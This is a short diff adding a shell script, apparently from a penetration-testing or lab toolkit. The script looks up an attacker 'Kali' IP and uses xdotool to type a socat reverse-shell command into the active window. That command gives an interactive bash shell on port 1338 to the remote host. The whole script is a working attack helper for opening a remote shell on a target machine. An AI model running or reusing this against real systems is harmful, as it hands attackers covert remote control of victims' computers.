@@ -1,0 +1,4 @@
+source ~/Desktop/base/code/xdotool/helpers/get_kali_ip
+
+command="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${KALI_IP}:1338"
+xdotool type "${command}"
